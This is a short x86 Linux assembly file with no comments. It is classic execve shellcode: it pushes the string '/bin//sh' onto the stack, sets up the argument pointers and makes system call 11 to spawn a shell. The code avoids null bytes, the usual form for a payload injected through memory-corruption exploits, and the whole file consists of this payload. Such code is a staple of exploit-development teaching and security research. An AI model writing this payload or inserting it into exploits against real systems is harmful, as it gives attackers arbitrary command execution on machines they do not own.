.section data


.section .text
.global _start
_start:
xorl %eax, %eax

pushl %eax
pushl $0x68732f2f
pushl $0x6e69622f

movl %esp, %ebx
pushl %eax
movl %esp, %edx

pushl %ebx
movl %esp, %ecx

end:
movb $11, %al
int $0x80





